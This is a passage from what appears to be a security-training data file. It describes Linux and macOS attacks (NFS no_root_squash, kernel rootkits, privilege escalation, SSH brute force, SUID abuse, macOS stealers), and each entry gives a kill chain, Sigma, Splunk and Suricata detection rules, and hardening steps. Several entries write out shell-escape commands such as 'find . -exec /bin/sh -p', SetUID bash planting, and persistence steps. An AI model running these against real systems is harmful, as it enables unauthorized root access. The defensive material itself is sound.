    shortName: "Linux NFS Attack",
    moduleGroup: "linux",
    module: "Module 6: Linux Security Attacks",
    category: "linux",
    severity: "high",
    cvss: "8.5",
    mitre: "T1021.002, T1078, T1083",
    primaryTargets: "Linux NFSv3/v4 Servers, /etc/exports Configuration, Port 2049, RPC Portmapper (111)",
    threatActors: "APT28, Red Team Penetration Testers, Automated Linux Scanners",
    summary: "Linux NFS Attacks target misconfigured Network File System exports on Linux servers. The most critical vulnerability is the presence of the 'no_root_squash' option combined with wildcard client IP permissions ('*') in /etc/exports. This misconfiguration allows an unauthenticated remote attacker to mount the shared export as local root (UID 0). The attacker creates an executable binary with the SetUID bit (chmod +s) on the mounted directory, which local users on the target host can then execute to gain immediate root privileges.",
    killChain: [
      {
        step: 1,
        title: "RPC Portmapper Discovery",
        mitre: "T1595.002",
        desc: "Probing target host TCP/UDP port 111 (rpcbind/portmapper) and port 2049 (NFS) to verify active remote procedure call services."
      },
      {
        step: 2,
        title: "Export Policy Enumeration (showmount)",
        mitre: "T1135",
        desc: "Issuing showmount -e query against the target to identify exported directory paths and client permission subnet filters."
      },
      {
        step: 3,
        title: "Rogue Client Mount & UID 0 Mapping",
        mitre: "T1021.002",
        desc: "Mounting the remote NFS export locally using mount -t nfs from an attacker machine operating under local UID 0 (root)."
      },
      {
        step: 4,
        title: "no_root_squash Verification",
        mitre: "T1083",
        desc: "Creating a test file within the mounted share and confirming that ownership reflects root:root rather than the squashed 'nobody' user."
      },
      {
        step: 5,
        title: "SUID Payload Planting (/bin/bash)",
        mitre: "T1548.001",
        desc: "Copying /bin/bash or a custom compiled privilege escalation wrapper onto the share and applying the SetUID permission bit (chmod 4755)."
      },
      {
        step: 6,
        title: "Host Execution & Interactive Root Shell Spawn",
        mitre: "T1059.004",
        desc: "Triggering the SUID binary on the target Linux system via SSH, web shell, or unprivileged user context to obtain EUID=0 root shell."
      }
    ],
    telemetry: {
      sources: [
        "Linux auditd Logs (Tracking syscalls execve, setuid, and chmod on NFS mount points)",
        "Syslog / rpc.mountd daemon logs (/var/log/messages or journalctl -u nfs-server)",
        "Network NetFlow / Zeek (RPC MOUNT and NFS procedures from unexpected client IPs)",
        "File Integrity Monitoring (AIDE / auditd monitoring /etc/exports)"
      ],
      anomalies: [
        "NFS mount requests originating from IP addresses outside authorized enterprise storage VLANs",
        "Creation of executable binaries with SUID permission bit (04755) on NFS mounted filesystems",
        "Repeated rpc.mountd authentication denials followed by successful mount"
      ]
    },
    rules: {
      sigma: `title: Suspicious SUID Binary Creation on NFS Export Mount
id: 6b3c9e18-52d4-4a01-8e31-7cf20a410070
status: stable
description: Detects file creation with SUID permissions on file paths associated with Network File System exports.
author: SOC Detection Engineering
logsource:
    product: linux
    service: auditd
detection:
    selection_chmod:
        syscall: 'chmod'
        mode|contains: '4'
    selection_fchmod:
        syscall: 'fchmodat'
    selection_path:
        name|contains:
            - '/mnt/'
            - '/media/'
            - '/nfs/'
            - '/shared/'
    condition: (selection_chmod or selection_fchmod) and selection_path
fields:
    - exe
    - name
    - auid
    - uid
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.001`,
      splunk: `index=linux_audit (syscall=chmod OR syscall=fchmodat) (path="/mnt/*" OR path="/shared/*" OR path="/nfs/*")
| eval Alert="HIGH: Suspicious Permission Modification / SUID Flag on Shared File System"
| table _time, host, exe, path, auid, uid, Alert`,
      suricata: `alert rpc $EXTERNAL_NET any -> $HOME_NET 2049 (
    msg:"SEC-ALERT Inbound NFS Mount Procedure from External Network";
    flow:to_server,established;
    content:"|00 01 86 A5|";
    classtype:attempted-recon;
    sid:1000070;
    rev:1;
)`,
      sysmon: `# Check /etc/exports for hazardous no_root_squash configurations:
grep -E "no_root_squash" /etc/exports`
    },
    defenseChecklist: [
      { id: "nfs_1", title: "Enforce root_squash on All Exports", tier: "NFS Server Hardening", desc: "Ensure all exports in /etc/exports utilize root_squash (or all_squash) to map remote root UID 0 to the unprivileged nobody account." },
      { id: "nfs_2", title: "Mount Shared Partitions with nosuid & nodev", tier: "Filesystem Policy", desc: "Ensure all client-side and server-side NFS mount configurations in /etc/fstab specify 'nosuid,nodev,noexec' options." },
      { id: "nfs_3", title: "Restrict Client IP Addresses in Exports", tier: "Network Segmentation", desc: "Never use wildcards ('*') in /etc/exports; restrict access exclusively to specific, authorized static IP addresses or CIDR blocks." },
      { id: "nfs_4", title: "Migrate to NFSv4 with Kerberos (RPCSEC_GSS)", tier: "Protocol Security", desc: "Deprecate legacy NFSv3 and require strong mutual Kerberos authentication for all NFS read/write transactions." }
    ]
  },

  {
    num: 71,
    id: "linux-rootkit-attack",
    name: "Linux Kernel Rootkit Attack (LKM Hooking & eBPF Process Stealth)",
    shortName: "Linux Kernel Rootkit",
    moduleGroup: "linux",
    module: "Module 6: Linux Security Attacks",
    category: "linux",
    severity: "critical",
    cvss: "9.4",
    mitre: "T1014, T1547.006, T1562.001",
    primaryTargets: "Linux Kernel (Ring 0), Loadable Kernel Modules (LKM), sys_call_table, eBPF Maps & Programs",
    threatActors: "Sandworm Team, BPFDoor Operators, Winnti Group, Turla",
    summary: "Linux Kernel Rootkit attacks represent the pinnacle of post-compromise stealth on Linux systems. Attackers compile or load Loadable Kernel Modules (LKMs) using insmod/modprobe or deploy malicious eBPF bytecode. Once resident in Ring-0 kernel memory, the rootkit modifies the system call table or hooks core virtual filesystem functions (such as sys_getdents64, sys_kill, and sys_read) to hide malicious processes, network sockets, backdoor files, and kernel modules from userland diagnostic utilities like ps, top, ls, and netstat.",
    killChain: [
      {
        step: 1,
        title: "Target Kernel Architecture Footprinting",
        mitre: "T1082",
        desc: "Interrogating the host kernel release (uname -r), installed kernel headers, and Secure Boot status to select matching rootkit code."
      },
      {
        step: 2,
        title: "Malicious LKM Compilation / eBPF Staging",
        mitre: "T1587.001",
        desc: "Compiling a kernel module (.ko) targeting kernel struct offsets or writing raw eBPF socket filter programs."
      },
      {
        step: 3,
        title: "Kernel Ingress (init_module / finit_module)",
        mitre: "T1547.006",
        desc: "Executing insmod or modprobe to load the module into Ring 0, triggering the module's init_module() entrypoint."
      },
      {
        step: 4,
        title: "System Call Table & VFS Hooking",
        mitre: "T1014",
        desc: "Disabling Write Protect (CR0.WP register) and rewriting sys_call_table pointers to intercept sys_getdents64 and sys_kill."
      },
      {
        step: 5,
        title: "Userland Process & Socket Cloaking",
        mitre: "T1562.001",
        desc: "Filtering out directory entries matching rootkit prefixes (e.g. hiding /proc/[PID] and backdoor files from readdir/getdents)."
      },
      {
        step: 6,
        title: "Magic Packet Activation & Covert Command Channel",
        mitre: "T1573",
        desc: "Activating raw packet sniffing hooks to trigger elevated root shells upon receiving a specific pre-shared ICMP or TCP payload."
      }
    ],
    telemetry: {
      sources: [
        "Linux auditd Logs (Tracking finit_module, init_module, and delete_module syscalls)",
        "Kernel Ring Buffer (/dev/kmsg, dmesg taint flags: 'loading out-of-tree module taints kernel')",
        "Memory Forensics (Volatility / LiME linux_pslist vs linux_pid_hash discrepancies)",
        "eBPF Telemetry Tools (Falco, Tetragon tracking bpf() syscalls)"
      ],
      anomalies: [
        "auditd log entries recording execution of init_module or finit_module by non-package manager processes",
        "Discrepancies between /proc PID directory listings and the active kernel task_struct linked list",
        "Kernel taint flag activated with 'OE' (Out-of-tree, Unsigned Module)"
      ]
    },
    rules: {
      sigma: `title: Linux Kernel Module Loaded (LKM Ingress)
id: 7c4d1e29-63a8-4b12-9f41-8df31b520071
status: stable
description: Detects the loading of an unauthorized kernel module via init_module or finit_module syscalls.
author: SOC Detection Engineering
logsource:
    product: linux
    service: auditd
detection:
    selection:
        syscall:
            - 'init_module'
            - 'finit_module'
    filter_pkg:
        exe|contains:
            - '/usr/bin/dpkg'
            - '/usr/bin/rpm'
            - '/usr/bin/apt'
            - '/usr/bin/yum'
    condition: selection and not filter_pkg
fields:
    - exe
    - syscall
    - auid
    - comm
level: critical
tags:
    - attack.persistence
    - attack.t1547.006
    - attack.defense_evasion
    - attack.t1014`,
      splunk: `index=linux_audit (syscall=init_module OR syscall=finit_module) NOT (exe="*dpkg*" OR exe="*apt*" OR exe="*yum*" OR exe="*rpm*")
| eval Alert="CRITICAL: Unauthorized Kernel Module Insertion (Potential LKM Rootkit)"
| table _time, host, exe, comm, auid, syscall, Alert`,
      suricata: `alert icmp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Suspected BPFDoor / Rootkit Magic Packet Activation";
    itype:8;
    content:"|52 4F 4F 54|"; depth:16;
    classtype:trojan-activity;
    sid:1000071;
    rev:1;
)`,
      sysmon: `# Inspect currently loaded Linux kernel modules and check for unsigned drivers:
lsmod | head -n 20`
    },
    defenseChecklist: [
      { id: "rootkit_1", title: "Enforce UEFI Secure Boot & Kernel Module Signing", tier: "Firmware Security", desc: "Enable Secure Boot and set CONFIG_MODULE_SIG_FORCE=y to reject any LKM not cryptographically signed by trusted CA." },
      { id: "rootkit_2", title: "Lock Down Runtime Module Loading", tier: "Kernel Hardening", desc: "Disable module loading after system initialization by executing: sysctl -w kernel.modules_disabled=1." },
      { id: "rootkit_3", title: "Deploy eBPF Runtime Threat Monitoring", tier: "Runtime EDR", desc: "Deploy Falco or Tetragon to trace kernel kprobes, tracepoints, and suspicious bpf() program loads in real time." },
      { id: "rootkit_4", title: "Enforce Kernel Memory Lockdown Mode", tier: "Kernel Hardening", desc: "Configure the Linux kernel lockdown feature in 'integrity' or 'confidentiality' mode to block raw memory writes via /dev/mem." }
    ]
  },

  {
    num: 72,
    id: "linux-privilege-escalation",
    name: "Linux Local Privilege Escalation (Kernel Exploits, Sudo Misconfigurations & Cron Hijacking)",
    shortName: "Linux Priv Escalation",
    moduleGroup: "linux",
    module: "Module 6: Linux Security Attacks",
    category: "linux",
    severity: "high",
    cvss: "8.8",
    mitre: "T1068, T1548.003, T1053.003, T1574.006",
    primaryTargets: "Linux Kernel (e.g. Dirty COW, Dirty Pipe), /etc/sudoers, Sudo GTFOBins, Root Cron Jobs",
    threatActors: "APT41, Kinsing Botnet, 8220 Gang, FIN7",
    summary: "Linux Privilege Escalation encompasses techniques utilized by low-privileged local users to achieve UID 0 (root). Prominent attack vectors include weaponizing unpatched kernel memory corruption vulnerabilities (such as CVE-2022-0847 Dirty Pipe or CVE-2016-5195 Dirty COW to overwrite read-only files like /etc/passwd), abusing excessive sudo permissions (NOPASSWD directives allowing escape to root via GTFOBins), or hijacking root-owned automated cron jobs through writable script directories.",
    killChain: [
      {
        step: 1,
        title: "System Environment & Permission Auditing",
        mitre: "T1082",
        desc: "Running automated enumeration commands (id, sudo -l, uname -a, cat /etc/cron*) to discover current capabilities and privileges."
      },
      {
        step: 2,
        title: "Vulnerability & Misconfiguration Identification",
        mitre: "T1068",
        desc: "Detecting unpatched kernel versions or identifying sudoers rules permitting unprivileged execution of GTFOBins (e.g. vim, find, awk)."
      },
      {
        step: 3,
        title: "Exploit Weaponization & Payload Staging",
        mitre: "T1587",
        desc: "Compiling a local kernel C exploit or drafting an inline shell breakout command sequence."
      },
      {
        step: 4,
        title: "Execution via Privileged Subsystem",
        mitre: "T1548.003",
        desc: "Executing the sudo escape command or triggering the kernel race condition to splice arbitrary bytes into page cache memory."
      },
      {
        step: 5,
        title: "SetUID Shell Realization (UID=0)",
        mitre: "T1059.004",
        desc: "Spawning an interactive root shell (/bin/bash -p) with effective user ID equal to 0."
      },
      {
        step: 6,
        title: "Administrative Footprint Retention & Anti-Forensics",
        mitre: "T1070.004",
        desc: "Adding an authorized SSH key to /root/.ssh/authorized_keys and clearing command histories (unset HISTFILE)."
      }
    ],
    telemetry: {
      sources: [
        "Linux /var/log/auth.log or /var/log/secure (sudo command logging)",
        "Linux auditd Logs (Syscall execve where euid=0 and auid!=0)",
        "Sysmon for Linux (Event ID 1 Process Creation: parent user standard, child user root)",
        "Cron Logs (/var/log/cron or journalctl -u cron)"
      ],
      anomalies: [
        "Unprivileged user invoking sudo -l followed immediately by interactive shell invocations from binaries like find, vi, or less",
        "Abrupt spawning of /bin/bash or /bin/sh with UID 0 where the parent process is owned by www-data or unprivileged user",
        "Kernel panic or page cache fault immediately followed by changes to /etc/passwd or /etc/shadow"
      ]
    },
    rules: {
      sigma: `title: Suspicious Sudo Execution Spawning Shell (GTFOBins)
id: 8d5e2f3a-74b9-4c23-9a52-9ef42c630072
status: stable
description: Detects command-line activity where sudo is invoked with utilities commonly abused to escape into root shells.
author: SOC Detection Engineering
logsource:
    product: linux
    service: auth
detection:
    selection:
        command|contains:
            - 'sudo vim'
            - 'sudo vi'
            - 'sudo find'
            - 'sudo awk'
            - 'sudo less'
            - 'sudo python'
            - 'sudo perl'
            - 'sudo tar'
    condition: selection
fields:
    - user
    - command
    - terminal
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.003`,
      splunk: `index=linux_auth "COMMAND=*bin/find*exec*" OR "COMMAND=*bin/vim*c*" OR "COMMAND=*bin/awk*"
| eval Alert="HIGH: Sudo Abuse Escape Vector Detected (Potential GTFOBins Exploitation)"
| table _time, host, user, COMMAND, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (
    msg:"SEC-ALERT High Frequency Sudo Command Execution Over SSH";
    flow:to_server,established;
    content:"sudo";
    threshold: type both, track by_src, count 5, seconds 30;
    classtype:suspicious-login;
    sid:1000072;
    rev:1;
)`,
      sysmon: `# Inspect sudo permissions for current user context:
sudo -l`
    },
    defenseChecklist: [
      { id: "linpe_1", title: "Strict Sudoers Least Privilege Configuration", tier: "Access Control", desc: "Never grant 'ALL' or wildcard 'NOPASSWD' in /etc/sudoers; restrict sudo strictly to explicit binary paths and forbid shell escapes." },
      { id: "linpe_2", title: "Continuous Kernel Patching & Live Patching", tier: "OS Maintenance", desc: "Deploy automated kernel updates with Canonical Livepatch or kpatch to rapidly eliminate Ring-0 vulnerabilities." },
      { id: "linpe_3", title: "Enforce AppArmor or SELinux in Enforcing Mode", tier: "Mandatory Access Control", desc: "Enable MAC profiles (SELinux enforcing mode) to confine web servers and services even if root execution is attained." },
      { id: "linpe_4", title: "Lock Down File Permissions on Cron Directories", tier: "System Integrity", desc: "Ensure /etc/cron* directories and scripts are owned strictly by root:root with non-writable permissions (chmod 700)." }
    ]
  },

  {
    num: 73,
    id: "ssh-brute-force",
    name: "Linux SSH Brute-Force Attack (Automated Dictionary & Credential Stuffing)",
    shortName: "SSH Brute-Force",
    moduleGroup: "linux",
    module: "Module 6: Linux Security Attacks",
    category: "linux",
    severity: "high",
    cvss: "7.8",
    mitre: "T1110.001, T1110.003, T1021.004",
    primaryTargets: "OpenSSH Daemon (sshd), Port 22, PAM Authentication, Linux System Accounts",
    threatActors: "Kinsing, Mirai Variants, Automated Threat Botnets, Initial Access Brokers",
    summary: "SSH Brute-Force is an automated attack against exposed OpenSSH daemons (TCP port 22) on Linux servers. Adversaries deploy high-throughput automated credential guessing tools and botnets (e.g. Hydra, Medusa, or custom multithreaded Python scripts) to cycle through extensive dictionary wordlists, stolen credential dumps, and default service credentials (e.g. root/root, ubuntu/ubuntu, admin/admin) to establish remote terminal access.",
    killChain: [
      {
        step: 1,
        title: "Port 22 Internet Sweeping & Fingerprinting",
        mitre: "T1595.001",
        desc: "Conducting mass port scans across public IP ranges to identify responsive OpenSSH daemons and grab version banners."
      },
      {
        step: 2,
        title: "Credential List Compilation & User Profiling",
        mitre: "T1589.001",
        desc: "Selecting targeted wordlists combining top default Linux accounts (root, admin, test) and enterprise breach passwords."
      },
      {
        step: 3,
        title: "High-Concurrence SSH Handshake Spooling",
        mitre: "T1110.001",
        desc: "Initiating hundreds of simultaneous TCP handshakes and SSH version exchanges to maximize password attempts per minute."
      },
      {
        step: 4,
        title: "Automated Authentication Cycling (PAM)",
        mitre: "T1110.003",
        desc: "Transmitting repeated SSH_MSG_USERAUTH_REQUEST packets with username and password combinations against Pluggable Authentication Modules."
      },
      {
        step: 5,
        title: "Successful Session Authorization & Shell Allocation",
        mitre: "T1021.004",
        desc: "Receiving SSH_MSG_USERAUTH_SUCCESS, negotiating an interactive PTY channel, and allocating an interactive bash session."
      },
      {
        step: 6,
        title: "Immediate Dropper Download & Ingress Persistence",
        mitre: "T1105",
        desc: "Executing automated curl/wget commands to download cryptocurrency miners or botnet persistence scripts into /tmp."
      }
    ],
    telemetry: {
      sources: [
        "Linux /var/log/auth.log or /var/log/secure (sshd: Failed password for ... from <IP>)",
        "Systemd Journal (journalctl -u ssh or journalctl -u sshd)",
        "Linux auditd (PAM authentication failure events)",
        "Network Zeek Logs (ssh.log with auth_success=F and high session counts)"
      ],
      anomalies: [
        "Dozens to hundreds of failed SSH authentication events for distinct usernames originating from a single foreign IP within minutes",
        "Repeated log entries stating 'Failed password for invalid user <user> from <IP>'",
        "Rapid surge in inbound TCP connections on port 22 with short session duration (< 3 seconds)"
      ]
    },
    rules: {
      sigma: `title: High Volume of SSH Authentication Failures (SSH Brute Force)
id: 9e6f3a4b-85c0-4d34-9a63-0fa53d740073
status: stable
description: Detects multiple failed SSH password attempts from a single source IP indicating automated brute force activity.
author: SOC Detection Engineering
logsource:
    product: linux
    service: auth
detection:
    selection:
        message|contains:
            - 'Failed password for'
            - 'authentication failure'
    condition: selection
fields:
    - src_ip
    - user
level: high
tags:
    - attack.credential_access
    - attack.t1110.001`,
      splunk: `index=linux_auth (message="*Failed password for*" OR message="*authentication failure*")
| rex field=message "from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)"
| stats count, values(user) as TargetedUsers by src_ip
| where count > 20
| eval Alert="CRITICAL: SSH Brute Force Attack in Progress"
| table _time, src_ip, TargetedUsers, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (
    msg:"SEC-ALERT Multiple SSH Failed Login Attempts (Brute Force)";
    flow:to_server,established;
    content:"SSH-";
    threshold: type both, track by_src, count 10, seconds 60;
    classtype:attempted-login;
    sid:1000073;
    rev:1;
)`,
      sysmon: `# Check recent failed SSH authentication attempts via bash:
grep -i "failed password" /var/log/auth.log | tail -n 20`
    },
    defenseChecklist: [
      { id: "ssh_1", title: "Disable Password Authentication Entirely", tier: "SSH Configuration", desc: "Set 'PasswordAuthentication no' in /etc/ssh/sshd_config to mandate public-key or FIDO2 hardware token authentication." },
      { id: "ssh_2", title: "Disable Root Remote Login", tier: "Access Control", desc: "Set 'PermitRootLogin no' in sshd_config to prevent direct brute forcing of the superuser account." },
      { id: "ssh_3", title: "Deploy Fail2ban / CrowdSec IPS", tier: "Automated Defense", desc: "Install and configure Fail2ban or CrowdSec to automatically drop IP addresses after 3 failed login attempts via iptables/nftables." },
      { id: "ssh_4", title: "Change Default Port & Place Behind VPN/Bastion", tier: "Network Architecture", desc: "Relocate SSH to a non-standard port and restrict port access to corporate VPN or Zero-Trust bastion hosts." }
    ]
  },

  {
    num: 74,
    id: "suid-exploitation",
    name: "Linux SetUID (SUID) Binary Exploitation (Privilege Boundary Bypass via GTFOBins)",
    shortName: "SUID Exploitation",
    moduleGroup: "linux",
    module: "Module 6: Linux Security Attacks",
    category: "linux",
    severity: "high",
    cvss: "8.4",
    mitre: "T1548.001, T1068, T1059.004",
    primaryTargets: "SUID Executables, /usr/bin, /usr/local/bin, File Capabilities, GTFOBins Binaries",
    threatActors: "APT28, DarkRadiation, Local Insider Threats, Privilege Escalation Exploits",
    summary: "SetUID (SUID) Exploitation occurs when an unprivileged user executes a binary that has the SUID permission bit set (4000) and is owned by root. When executed, the binary runs with the effective privileges of the file owner (root) rather than the executing user. If the binary possesses arbitrary file read/write, shell escape mechanisms, or insecure library loading (GTFOBins such as find, nmap, bash, cp, vim, or python), an attacker leverages these built-in functionalities to spawn a full root shell.",
    killChain: [
      {
        step: 1,
        title: "Local Filesystem SUID Discovery",
        mitre: "T1083",
        desc: "Executing filesystem enumeration (find / -perm -4000 -type f 2>/dev/null) to catalog all SUID binaries across all mounted partitions."
      },
      {
        step: 2,
        title: "GTFOBins Vulnerability Cross-Referencing",
        mitre: "T1068",
        desc: "Comparing the discovered SUID binaries against known GTFOBins escape primitives and custom in-house compiled utilities."
      },
      {
        step: 3,
        title: "Shared Library & Environment Variable Probing",
        mitre: "T1574.006",
        desc: "Inspecting the binary using ldd and strings to identify missing shared libraries or unquoted relative system commands susceptible to PATH hijacking."
      },
      {
        step: 4,
        title: "Crafted Argument & Escape Vector Assembly",
        mitre: "T1548.001",
        desc: "Constructing the execution payload (e.g. find . -exec /bin/sh -p \\; -quit or manipulating LD_PRELOAD where allowed)."
      },
      {
        step: 5,
        title: "EUID 0 Interactive Shell Spawn",
        mitre: "T1059.004",
        desc: "Executing the SUID binary with the exploit argument to inherit root capabilities and launch an interactive shell with effective UID 0."
      },
      {
        step: 6,
        title: "Permanent Superuser Access Institutionalization",
        mitre: "T1136.001",
        desc: "Writing a new UID 0 user into /etc/passwd or setting the SUID bit on a copy of /bin/bash for permanent unmonitored elevation."
      }
    ],
    telemetry: {
      sources: [
        "Linux auditd Logs (Tracking execve syscall with euid=0 when auid != 0)",
        "Sysmon for Linux (Event ID 1 Process Creation: CommandLine containing SUID GTFOBins flags)",
        "File Integrity Monitoring (AIDE tracking file mode modifications in /usr/bin)",
        "Linux Process Accounting (psacct / acct logs)"
      ],
      anomalies: [
        "Execution of non-standard binaries located in /tmp, /dev/shm, or /home possessing SUID permissions",
        "Process creation where the child process is /bin/sh or /bin/bash with effective UID 0 spawned by utilities like find, vim, or env",
        "Repeated find or stat commands scouring the entire root directory with '-perm -4000' flags"
      ]
    },
    rules: {
      sigma: `title: Execution of GTFOBins SUID Binary with Shell Escape
id: 1a7f4e5c-96d1-4e45-9b74-1fa64e850074
status: stable
description: Detects command-line execution of SUID-abusable binaries passing arguments that trigger interactive root shells.
author: SOC Detection Engineering
logsource:
    product: linux
    category: process_creation
detection:
    selection_cmd:
        CommandLine|contains:
            - ' -exec /bin/sh'
            - ' -exec /bin/bash'
            - ':!/bin/sh'
            - ':!/bin/bash'
            - 'import os; os.execl("/bin/sh"'
    condition: selection_cmd
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.001`,
      splunk: `index=linux_sysmon EventCode=1 (CommandLine="*find*-exec*/bin/sh*" OR CommandLine="*find*-exec*/bin/bash*" OR CommandLine="*python*-c*import os*")
| eval Alert="HIGH: SUID Binary Abuse Shell Escape Attempt Detected"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Network correlation rule for web shell invoking SUID search:
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT HTTP Request Searching for SUID Files";
    flow:to_server,established;
    content:"find"; content:"-perm"; content:"-4000";
    classtype:web-application-attack;
    sid:1000074;
    rev:1;
)`,
      sysmon: `# Enumerate all SUID binaries on Linux host via bash:
find / -perm -4000 -type f 2>/dev/null`
    },
    defenseChecklist: [
      { id: "suid_1", title: "Audit & Strip Unnecessary SUID Permissions", tier: "System Hardening", desc: "Audit all binaries with SUID bits and remove the bit from unnecessary utilities: chmod u-s /usr/bin/<binary>." },
      { id: "suid_2", title: "Mount Writable Partitions with nosuid Flag", tier: "Filesystem Policy", desc: "Ensure /tmp, /var/tmp, /home, and /dev/shm are mounted with the 'nosuid' option in /etc/fstab to prevent execution of planted SUID files." },
      { id: "suid_3", title: "Deploy File Integrity Monitoring (FIM)", tier: "Integrity Verification", desc: "Configure AIDE or Tripwire to alert immediately upon any change in file permissions or attributes in system binary directories." },
      { id: "suid_4", title: "Replace SUID with Fine-Grained Linux Capabilities", tier: "Modern Least Privilege", desc: "Replace monolithic SUID permissions with granular Linux capabilities (setcap cap_net_bind_service=+ep) where feasible." }
    ]
  },

  // =========================================================================
  // MODULE 6: OPERATING SYSTEM SECURITY - MACOS ATTACKS (75 - 79)
  // =========================================================================
  {
    num: 75,
    id: "macos-privilege-escalation",
    name: "macOS Local Privilege Escalation (XPC Services, AuthorizationDB & TCC Subversion)",
    shortName: "macOS Priv Escalation",
    moduleGroup: "macos",
    module: "Module 6: macOS Security Attacks",
    category: "macos",
    severity: "high",
    cvss: "8.6",
    mitre: "T1548.002, T1548.003, T1068",
    primaryTargets: "macOS Darwin Kernel, Transparency Consent and Control (TCC), authorizationdb, Privileged Helper Tools",
    threatActors: "APT28, OceanLotus (APT32), Mac-focused Red Teams, Shlayer Authors",
    summary: "macOS Privilege Escalation involves an adversary bypassing macOS security boundaries to elevate from an unprivileged user session to root or bypass Transparency, Consent, and Control (TCC) restrictions. Attackers exploit insecure Mach-O XPC inter-process communication interfaces in root-privileged helper tools, manipulate misconfigured rights in authorizationdb, or leverage vulnerability chains in PrivilegedHelperTools lacking proper cryptographic code-signature validation.",
    killChain: [
      {
        step: 1,
        title: "Endpoint Environment & SIP Verification",
        mitre: "T1082",
        desc: "Checking macOS build version, System Integrity Protection status (csrutil status), and current group memberships."
      },
      {
        step: 2,
        title: "Privileged Helper & XPC Service Enumeration",
        mitre: "T1057",
        desc: "Auditing daemons located in /Library/PrivilegedHelperTools and /Library/LaunchDaemons to identify root-running Mach services."
      },
      {
        step: 3,
        title: "Mach-O Entitlements & Code Signing Audit",
        mitre: "T1068",
        desc: "Inspecting binary entitlements (codesign -d --entitlements) to spot missing client signature checks in shouldAcceptNewConnection."
      },
      {
        step: 4,
        title: "Crafted Mach Message / XPC Payload Dispatch",
        mitre: "T1548.002",
        desc: "Connecting to the vulnerable XPC listener and dispatching malicious protocol messages requesting privileged execution or file movement."
      },
      {
        step: 5,
        title: "Privileged Execution & Root Process Spawning",
        mitre: "T1548",
        desc: "The vulnerable root helper executes attacker instructions, spawning a root shell or writing into protected system locations."
      },
      {
        step: 6,
        title: "TCC Database Bypass & Privacy Access Grant",
        mitre: "T1562.001",
        desc: "Directly modifying or injecting into the TCC.db to grant silent access to Camera, Microphone, and Full Disk Access without user prompts."
      }
    ],
    telemetry: {
      sources: [
        "Apple Endpoint Security Framework (ESF events: ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_SETEUID)",
        "macOS Unified Logging (log show --predicate 'process == \"taskgated\" or process == \"tccd\"')",
        "System Configuration Logs (/var/log/system.log)",
        "Auditd / BSM Audit Trails on macOS"
      ],
      anomalies: [
        "PrivilegedHelperTool binaries executing commands or scripts directly in /tmp or /Users/Shared",
        "Sudden modification of /Library/Application Support/com.apple.TCC/TCC.db without prompt",
        "XPC connections established to privileged daemons from untrusted, unsigned application bundles"
      ]
    },
    rules: {
      sigma: `title: Suspicious Execution of Root Shell by macOS Privileged Helper
id: 2b8f5e6d-97e2-4f56-9c85-2fb75f960075
status: stable
description: Detects a root-level shell spawned by a Privileged Helper Tool on macOS indicating XPC privilege escalation.
author: SOC Detection Engineering
logsource:
    product: macos
    category: process_creation
detection:
    selection_parent:
        ParentImage|contains: '/Library/PrivilegedHelperTools/'
    selection_child:
        Image|endswith:
            - '/bin/sh'
            - '/bin/bash'
            - '/bin/zsh'
    condition: selection_parent and selection_child
fields:
    - ParentImage
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.002`,
      splunk: `index=macos_endpoint EventType=EXEC ParentImage="/Library/PrivilegedHelperTools/*" (Image="/bin/sh" OR Image="/bin/zsh")
| eval Alert="CRITICAL: Privileged Helper Spawning Shell (Potential macOS XPC Privilege Escalation)"
| table _time, host, ParentImage, Image, User, Alert`,
      suricata: `# Network signature detecting C2 payload triggering macOS exploit:
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Inbound macOS Privilege Escalation Exploit Payload";
    flow:to_server,established;
    content:"com.apple.TCC.db"; nocase;
    classtype:bad-unknown;
    sid:1000075;
    rev:1;
)`,
      sysmon: `# Verify System Integrity Protection (SIP) status on macOS terminal:
csrutil status`
    },
    defenseChecklist: [
      { id: "macpe_1", title: "Validate XPC Client Code Signing in Daemons", tier: "Application Hardening", desc: "Always implement SecCodeCopyGuestWithProcessIdentifier and verify client team ID and bundle ID before accepting XPC connections." },
      { id: "macpe_2", title: "Enforce System Integrity Protection (SIP)", tier: "OS Security", desc: "Ensure System Integrity Protection is enabled across all endpoints to prevent tampering with system binaries and protected directories." },
      { id: "macpe_3", title: "Audit PrivilegedHelperTools Directory", tier: "Integrity Audit", desc: "Regularly audit /Library/PrivilegedHelperTools to identify legacy, unmaintained, or vulnerable third-party helper daemons." },
      { id: "macpe_4", title: "Deploy Mobile Device Management (MDM) Profiles", tier: "Fleet Governance", desc: "Deploy Apple MDM configuration profiles locking down TCC permissions and restricting standard users from admin approval." }
    ]
  },

  {
    num: 76,
    id: "macos-malware-attack",
    name: "macOS Malware Attack (Stealers, Trojanized DMGs & Keychain Exfiltration)",
    shortName: "macOS Malware Attack",
    moduleGroup: "macos",
    module: "Module 6: macOS Security Attacks",
    category: "macos",
    severity: "critical",
    cvss: "8.8",
    mitre: "T1204.002, T1059.002, T1555.001",
    primaryTargets: "macOS User Keychain, Web Browsers (Chrome/Safari), Crypto Wallets, Developer SSH Keys",
    threatActors: "Atomic Stealer (AMOS) Operators, Lazarus Group (RustBucket), Shlayer, MacStealer",
    summary: "macOS Malware Attacks deploy sophisticated InfoStealers and Trojans targeting Apple endpoints. Typically delivered via deceptive disk images (.dmg), trojanized pirated software, or malvertising, the malware uses AppleScript dialog spoofing to deceive users into providing administrative passwords. Once executed, it harvests passwords from the macOS Keychain, extracts browser autofill credentials, copies cryptocurrency wallet datastores, and exfiltrates the compressed archive to external C2 servers.",
    killChain: [
      {
        step: 1,
        title: "Social Engineering & DMG Ingress",
        mitre: "T1204.002",
        desc: "Luring victims into downloading a malicious .dmg disk image disguised as a cracked software application or essential browser update."
      },
      {
        step: 2,
        title: "User Mount & Deceptive Execution Prompt",
        mitre: "T1105",
